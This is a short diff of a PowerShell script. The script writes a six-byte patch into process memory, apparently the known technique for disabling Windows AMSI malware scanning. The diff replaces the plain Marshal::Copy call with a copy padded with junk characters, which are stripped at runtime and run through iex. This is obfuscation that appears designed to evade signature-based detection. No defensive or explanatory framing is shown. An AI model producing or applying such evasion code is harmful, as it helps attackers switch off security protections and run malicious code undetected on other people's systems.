@@ -22,4 +22,5 @@ $mcet = "0x07"
 $tfwz = "0x80"
 $dufv = "0xC3"
 $scnfh = [Byte[]] ($junr,$ccwg,$boxa,$mcet,+$tfwz,+$dufv)
-[System.Runtime.InteropServices.Marshal]::Copy($scnfh, 0, $ppruhu, 6)
+$string1 = '[S#$%^&*ystem.R#$%^&*untime.I#$%^&*nteropServi#$%^&*ces.Marshal]::#$%^&*Copy($sc#$%^&*nfh, 0, $pp#$%^&*ruhu#$%^&*, #$%^&*6)'.Replace('#$%^&*','')
+iex $string1
